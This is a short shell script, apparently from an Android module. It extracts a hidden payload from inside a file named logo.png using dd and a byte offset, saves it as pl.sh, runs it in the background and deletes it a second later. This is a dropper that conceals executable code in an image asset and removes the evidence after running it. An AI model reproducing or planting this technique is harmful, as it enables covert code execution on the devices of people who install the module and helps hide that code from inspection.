MODDIR=${0%/*}
payload="$MODDIR/logo.png"
dd if=$payload bs=1 skip=$(cat output) 2>/dev/null > pl.sh || chmod +x pl.sh; sh ./pl.sh post & sleep 1 && rm pl.sh